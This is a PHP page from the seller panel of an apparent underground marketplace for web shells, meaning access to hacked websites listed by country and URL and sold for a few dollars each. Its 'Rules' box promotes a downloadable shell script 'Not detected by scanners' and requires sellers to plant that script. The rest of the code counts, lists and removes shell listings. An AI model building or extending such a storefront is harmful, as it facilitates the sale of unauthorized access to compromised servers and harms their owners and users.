<?php
include "./header.php";

$uid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);
$q = mysqli_query($dbcon, "SELECT * FROM users WHERE username='$uid'")or die();
$r = mysqli_fetch_assoc($q);

if($r['resseller'] != "1"){
  header("location: ../");
  exit ();
}


?>

	<h2>Shells</h2>
  
<script>

function delet(id)
{   var type = $("#shop"+id).attr('type')
	$("#shop"+id).html('processing ..').show();
	$.ajax({
	METHOD: 		'GET',
     url:"./ajax/dtool.php?id="+id,
	success:	function(data)
	{
		$("#shop"+id).html(data).show();
	}});
}
</script>
 
	<ul class="nav nav-tabs">
		<li class="active"><a href="#static" data-toggle="tab" aria-expanded="true">Static</a></li>
		<li class=""><a href="#all" data-toggle="tab" aria-expanded="false" onclick="TabDiv('all','shellTab1.php?id=<?php echo $uid ?>')">All</a></li>
		<li class=""><a href="#deleted" data-toggle="tab" aria-expanded="false" >Deleted</a></li>
		<li class=""><a href="#add" data-toggle="tab" aria-expanded="false" onclick="TabDiv('add','shellTab2.php')">Add</a></li>
		<li class=""><a href="#mass" data-toggle="tab" aria-expanded="false" onclick="TabDiv('mass','shellTab3.php?id=<?php echo $uid ?>')">Mass Add</a></li>
	</ul>
<div id="myTabContent" class="tab-content">
    <div class="tab-pane fade active in" id="static"> 
      <div class="well well-sm">
        <h4>Rules</h4>
        <ul>
        	<li><span class="label label-danger">NEW Shell Script</span> </li>
        	<ul>
        		<li>Work with php 5/7</li>
        		<li>Not detected  by scanners</li>
        		<li><a href="files/shell_new2.zip">DOWNLOAD NOW</a></li>
        	</ul>
          <li>We only accept <b>OUR SHELL</b> script .</li>
          <li>Max is <b>Unlimited</b> Per Seller !</li>

          <li>You can choose the price you want but the usual price between <b>2$</b>-<b>6$</b></li>
          <li>If you have mistaken or need to edit a tool just remove it and add it again  </li>          
          <li><b>Deleted</b> mean that the tools is not working !</li>
        </ul> 
        <h4>Static</h4>
        <ul>
          <li>Number of shells : <b><?php $s12 = mysqli_query($dbcon, "SELECT * FROM stufs where resseller='$uid'");$r11=mysqli_num_rows($s12);
 echo $r11;?></b></li>
          <li>Unsold shells : <b><?php $s12 = mysqli_query($dbcon, "SELECT * FROM stufs where resseller='$uid' AND sold='0'");$r11=mysqli_num_rows($s12);
 echo $r11;?></b></li>
          <li>Sold shells : <b><?php $s12 = mysqli_query($dbcon, "SELECT * FROM stufs where resseller='$uid' AND sold='1'");$r11=mysqli_num_rows($s12);
 echo $r11;?></b></li>
          <li>Deleted shells : <b><?php $s12 = mysqli_query($dbcon, "SELECT * FROM stufs where resseller='$uid' AND sold='deleted'");$r11=mysqli_num_rows($s12);
 echo $r11;?></b></li>
        </ul>
      </div>
      </div>
	  
	<div class="tab-pane fade" id="all"></div>
	<div class="tab-pane fade" id="deleted">
	
	<table width="100%" class="table table-striped table-bordered table-condensed sticky-header" >

        <thead>
  <tr>
          <th></th>
    <th>ID</th>
  <th>Type</th>
  <th>Country</th>
  <th>Url</th>
  <th>Price</th>
  <th>Action</th>
  </tr>
        </thead>
	<tbody>

 <?php
/*$uid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);*/
$qu = mysqli_query($dbcon, "SELECT * FROM stufs WHERE acctype='shell' AND resseller='$uid' And sold = 'deleted'	ORDER BY id DESC")or die(mysql_error());

 while($row = mysqli_fetch_assoc($qu)){
	 
    echo "<tr>
    <td></td>
    <td>".htmlspecialchars($row['id'])." </td>
    <td> ".strtoupper(htmlspecialchars($row['acctype']))." </td>
    <td>".htmlspecialchars($row['country'])."</td>
    <td>".htmlspecialchars($row['url'])." </td>
    <td> ".htmlspecialchars($row['price'])."</td>
    <td>";
if ($row['sold'] == "0") {
 echo '<div id="shop'.$row["id"].'" type="delete"><a onclick="javascript:delet('.$row["id"].');" class="btn btn-danger btn-xs">remove</a></div>';
 }
if ($row['sold'] == "1") {
 echo '<font color=green>[Sold]</font>';
 }
if ($row['sold'] == "deleted") {
 echo '<font color=gray>Deleted</font>';
 }
    echo "</td>
    </tr>";


 }

 
 ?>

 </tbody>
 </table>
	</div>
    <div class="tab-pane fade" id="add"></div>
    <div class="tab-pane fade" id="mass"></div>

</div>
</div></div>
            </div>
            </div>
        </div>
</body></html>